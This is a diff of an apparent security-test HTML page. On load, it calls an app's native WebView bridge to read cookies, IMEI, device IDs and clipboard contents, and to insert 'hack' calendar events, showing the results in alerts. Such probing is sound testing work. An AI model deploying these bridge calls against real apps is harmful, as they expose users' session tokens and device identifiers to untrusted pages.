@@ -15,28 +15,34 @@
             window.interConnection.closeWebviewRefresh();
         }
 
+
         function copy() {
             window.interConnection.copy("You have been hack!!!");
         }
 
+
         function toGetCID() {
             window.interConnection.getCID();
         }
-
-        function getCID(result) {
+        function getCIDCallback(result) {
             document.getElementById("content").innerText = "getCID:\n" + JSON.stringify(result);
             alert(JSON.stringify(result));
-            // document.getElementById("content").innerHTML = result;
         }
+
 
         function getCookie() {
-            var result = window.interConnection.getCookie();
-            document.getElementById("content").innerText = "getCookie:\n" + result;
+            window.interConnection.getCookie();
+        }
+        function NegativeGetTokenCallback(result) {
+            alert(JSON.stringify(result));
         }
 
+
         function getIMEI() {
-            var result = window.interConnection.getIMEI();
-            document.getElementById("content").innerText = "getIMEI:\n" + result;
+            window.interConnection.getIMEI();
+        }
+        function getIMEICallback(result){
+            alert(JSON.stringify(result));
         }
 
         function getShareData() {
@@ -50,7 +56,7 @@
 
         function insertCalendarEvent() {
             var date = new Date();
-            var time = date.getTime;
+            var time = date.toLocaleDateString;
             window.interConnection.insertCalendarEvent("hack", "hahahahahahaha", time, time);
         }
 
@@ -66,10 +72,14 @@
             window.interConnection.openWeixinMiniProgram("hack", "path", 1);
         }
 
+
         function paste() {
-            var result = window.interConnection.paste();
-            document.getElementById("content").innerText = "paste:\n" + result;
+            window.interConnection.paste();
         }
+        function getPaste(result){
+            alert(JSON.stringify(result));
+        }
+
 
         function refreshPage() {
             window.interConnection.refreshPage();
@@ -104,15 +114,16 @@
         }
 
         //         setInterval(gotoWhiteUrl,5);//5毫秒
-//         copy();
-        toGetCID();
-        getCID();
-//         getCookie();
-//         getIMEI();
-//         showPicturesWithUrl();
-//         turnOffPush();
-//         insertCalendarEvent();
-//         zCircleModePhoneCall();
+        // copy();
+        // toGetCID();
+        // getCIDCallback();
+        getCookie();
+        NegativeGetTokenCallback();
+        // getIMEI();
+        // showPicturesWithUrl();
+        // turnOffPush();
+        // insertCalendarEvent();
+        // zCircleModePhoneCall();
     </script>
 </body>
 
